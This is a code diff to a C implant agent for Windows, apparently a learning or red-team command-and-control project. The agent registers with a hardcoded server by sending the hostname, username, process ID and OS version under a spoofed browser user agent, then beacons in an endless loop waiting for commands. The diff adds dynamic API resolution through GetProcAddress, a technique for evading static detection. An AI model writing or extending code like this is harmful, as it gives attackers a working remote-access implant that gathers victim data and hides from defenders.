@@ -2,33 +2,18 @@
 #include <wininet.h>
 #include <wincrypt.h>
 #include <stdio.h>
-
-struct job_registration {
-    CHAR hostname[MAX_PATH];
-    CHAR username[MAX_PATH];
-    DWORD process_id;
-    DWORD version;
-}job;
-
-struct agent_information {
-    CHAR *address;
-    CHAR *user_agent;
-    INT port;
-    CHAR *path;
-    CHAR *key;
-    CHAR *identifier;
-}agent;
+#include <settings.h>
+#include <imports.h>
 
 BOOL Registration(CHAR **cookie) {
-    DWORD hostname_length = 260;
-    DWORD username_buffer = 260;
+    HMODULE hkernel32 = LoadLibraryA("kernel32.dll");
+    GETCOMPUTERNAMEA myGetComputerNameA = (GETCOMPUTERNAMEA) GetProcAddress(hkernel32, "GetComputerNameA");
+    //GETUSERNAMEA myGetUserNameA = (GETUSERNAMEA) GetProcAddress(hkernel32, "GetUserNameA"); This call isn't working not sure why
+    GETCURRENTPROCESSID myGetCurrentProcessId = (GETCURRENTPROCESSID) GetProcAddress(hkernel32, "GetCurrentProcessId");
+    GETVERSION myGetVersion = (GETVERSION) GetProcAddress(hkernel32, "GetVersion");
 
-    agent.address = "192.168.227.131";
-    agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
-    agent.port = 8080;
-    agent.path = "/about-us";
-    agent.key = "boondoggle";
     agent.identifier = "register";
+
 
     CHAR *format = "%s:%s,%s,%d,%d,%s";
     
@@ -46,21 +31,25 @@ BOOL Registration(CHAR **cookie) {
     CHAR content_length[MAX_PATH];
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
 
-    if (GetComputerNameA(job.hostname, &hostname_length)) {
+
+    DWORD hostname_length = 260;
+    if (myGetComputerNameA(job.hostname, &hostname_length)) {
         printf("Hostname: %s \n", job.hostname);
     }
 
+    DWORD username_buffer = 260;
     if (GetUserNameA(job.username, &username_buffer)) {
         printf("Username: %s \n", job.username);
     }
 
-    if (job.process_id = GetCurrentProcessId()) {
+    if (job.process_id = myGetCurrentProcessId()) {
         printf("Process ID: %lu \n", job.process_id);
     }
 
-    if (job.version = GetVersion()) {
+    if (job.version = myGetVersion()) {
         printf("Host Version: %lu \n", job.version);
     }
+
 
     HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet != NULL) {
@@ -113,13 +102,8 @@ BOOL Registration(CHAR **cookie) {
 
 BOOL Beacon(CHAR  *cookie) {
     CHAR *cmd = NULL;
-
-    agent.address = "192.168.227.131";
-    agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
-    agent.port = 8080;
-    agent.path = "/about-us";
-    agent.key = "boondoggle";
     agent.identifier = "beacon";
+
 
     CHAR *format = "%s:%s";
     
@@ -136,6 +120,7 @@ BOOL Beacon(CHAR  *cookie) {
 
     CHAR content_length[MAX_PATH];
     sprintf_s(content_length, MAX_PATH, "Content-Length: %lu\r\n", post_buffer_length);
+
 
     HINTERNET hInternet = InternetOpenA(agent.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (hInternet != NULL) {
@@ -173,8 +158,16 @@ void Sleep_Time() {
 
 int main() {
     CHAR *cookie = NULL;
+    agent.address = "192.168.227.131";
+    agent.user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36";
+    agent.port = 8080;
+    agent.path = "/about-us";
+    agent.key = "boondoggle";
+
     Registration(&cookie);
+    Sleep_Time();
     printf(cookie);
+
     while(TRUE) {
         Beacon(cookie);
         Sleep_Time();
